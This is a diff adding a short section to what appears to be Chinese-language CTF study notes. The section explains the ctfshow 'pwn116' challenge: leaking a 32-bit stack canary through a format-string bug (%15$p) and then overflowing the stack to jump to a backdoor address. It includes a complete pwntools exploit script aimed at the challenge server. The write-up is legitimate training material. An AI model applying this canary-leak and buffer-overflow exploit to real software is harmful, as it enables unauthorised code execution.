@@ -4043,6 +4043,47 @@ v3就是canary，在ctfshow的最底下返回的就是v3和传入内容后canary
 
 其他东西没什么好说的
 
+## pwn116
+
+32位canary
+
+存在格式化字符串漏洞
+
+用%数字$p找找\00结尾的
+
+找到了就是canary参数位置
+
+然后栈溢出就好了
+
+```python
+from pwn import *
+io = remote("pwn.challenge.ctf.show",28117)
+
+# io = process("./pwn116")
+
+backdoor = 0x8048586
+
+#逐个利用fmt漏洞调试，经测试，%15$p会出现/00,标准的canary
+
+# 利用这一点，泄漏canary
+
+leak = io.sendline(b'%15$p')
+io.recvuntil(b'0x')
+
+# canary = int(io.recv(8),16)
+
+canary = int(io.recv()[:8],16)
+print(canary)
+
+#构造payload
+payload = b'a' *(32) + p32(canary) + b'a'*12 + p32(backdoor)
+
+io.sendline(payload)
+io.interactive()
+```
+
+
+
 # 复现平台
 
 ### ret2text
